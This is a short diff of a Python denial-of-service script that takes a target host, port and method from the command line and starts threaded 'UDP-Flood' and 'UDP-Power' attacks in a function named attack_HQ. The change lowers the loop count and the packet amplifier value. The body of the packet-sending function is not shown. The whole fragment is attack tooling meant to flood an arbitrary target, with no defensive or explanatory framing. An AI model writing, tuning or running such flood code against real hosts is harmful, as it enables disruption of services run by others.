@@ -5,7 +5,7 @@ import threading
 host = str(sys.argv[1])
 port = int(sys.argv[2])
 method = str(sys.argv[3])
-loops = 5
+loops = 2
 
 def send_packet(amplifier):
     try:
@@ -21,7 +21,7 @@ def send_packet(amplifier):
 def attack_HQ():
     if method == "UDP-Flood":
         for sequence in range(loops):
-            threading.Thread(target=send_packet(5243), daemon=True).start()
+            threading.Thread(target=send_packet(750), daemon=True).start()
     if method == "UDP-Power":
         for sequence in range(loops):
             threading.Thread(target=send_packet(7864), daemon=True).start()
